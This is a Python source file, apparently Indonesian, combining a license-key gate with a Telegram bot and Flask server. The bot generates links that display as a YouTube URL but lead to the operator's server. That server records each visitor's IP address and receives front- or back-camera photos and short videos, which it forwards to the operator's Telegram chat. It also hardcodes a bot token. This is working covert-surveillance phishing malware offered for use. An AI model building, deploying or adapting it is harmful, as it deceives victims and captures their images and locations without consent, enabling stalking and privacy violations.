import os, telebot, threading, io, time
from flask import Flask, render_template, request, jsonify
from datetime import datetime
import os
import time
import requests
import sys

RAW_URL = "https://raw.githubusercontent.com/Ibnubae765/license-system/main/license.txt"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print("=" * 40)
    print("        LICENSE VERIFICATION")
    print("=" * 40)

def loading():
    clear()
    print("License Valid!\n")
    for i in range(1, 101):
        filled = i // 5
        bar = "█" * filled + "░" * (20 - filled)
        sys.stdout.write(f"\rLoading [{bar}] {i}%")
        sys.stdout.flush()
        time.sleep(0.05)
    print("\n\nAccess Granted!")

def get_keys():
    try:
        r = requests.get(RAW_URL, timeout=10)
        if r.status_code == 200:
            return [x.strip() for x in r.text.splitlines() if x.strip()]
    except:
        pass
    return []

def verify():
    clear()
    banner()
    key = input("Masukkan License Key : ").strip()

    keys = get_keys()

    if key in keys:
        loading()
        main_script()
    else:
        print("\nLicense Invalid / Not Found")

def main_script():
    time.sleep(1)
    clear()
    print("Masuk ke fitur utama script di sini...")

if __name__ == "__main__":
    verify()
TOKEN = "8648394453:AAGahBL3Vvx7p8mdTDJek4q3MMxAiCO-fRw"
BASE_URL = "https://youtube.idstore.my.id" 
GROUP_ID = "-5022650805" 
DEFAULT_YT_ID = "wq99zWjjllc"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

collection = {}
user_temp = {}

# [ALL BOT FUNCTIONS - SAMA PERSIS]
def cam_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.row("🤳 Front Camera", "📷 Back Camera")
    return markup

def mode_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.row("📸 8 Photos", "🎥 3s Video")
    return markup

@bot.message_handler(commands=['start'])
def start(m):
    user_temp[m.chat.id] = {'cam': 'user', 'mode': 'photo'}
    bot.send_message(m.chat.id, f"⚙️ <b>Id Store Active</b>\n\n<b>Step 1:</b> Pilih kamera:", reply_markup=cam_menu(), parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Camera", "📷 Back Camera"])
def set_cam(m):
    if m.chat.id not in user_temp: user_temp[m.chat.id] = {}
    user_temp[m.chat.id]['cam'] = 'user' if "Front" in m.text else 'environment'
    bot.send_message(m.chat.id, f"✅ Kamera: <b>{m.text}</b>\n\n<b>Step 2:</b> Pilih mode:", reply_markup=mode_menu(), parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def set_mode_and_generate(m):
    if m.chat.id not in user_temp:
        bot.send_message(m.chat.id, "❌ Sesi habis. /start")
        return
    user_temp[m.chat.id]['mode'] = 'photo' if "Photos" in m.text else 'video'
    d = user_temp[m.chat.id]
    raw_link = f"{BASE_URL.rstrip('/')}/?id={m.chat.id}&mode={d['mode']}&cam={d['cam']}&ytid={DEFAULT_YT_ID}"
    fake_yt_url = f"https://youtu.be/{DEFAULT_YT_ID}"
    hyperlink = f'<a href="{raw_link}">{fake_yt_url}</a>'
    response = f"🚀 <b>Link Ready!</b>\n\n<b>Link:</b>\n{hyperlink}\n\n<code>{raw_link}</code>"
    bot.send_message(m.chat.id, response, parse_mode="HTML", disable_web_page_preview=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    session_key = f"{tid}_{ip.replace('.', '_')}"
    collection[session_key] = {"photos": [], "creator": tid}
    print(f"🎯 HIT: {ip} -> {tid}")
    return jsonify({"status": "OK"})

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    if 'file' not in request.files: return "No file", 400
    file_bytes = request.files['file'].read()
    
    try:
        file_type = request.args.get('type', 'photo')
        if file_type == 'video':
            bot.send_video(int(tid), io.BytesIO(file_bytes), caption="🎥 Video")
        else:
            bot.send_photo(int(tid), io.BytesIO(file_bytes), caption="📸 Photo")
        print(f"✅ Sent: {len(file_bytes)} bytes")
        return "OK"
    except:
        return "Error", 500

def run_bot():
    print("🤖 Bot running...")
    bot.infinity_polling()

if __name__ == "__main__":
    print("🚀 Id Store starting...")
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=8000, debug=False)
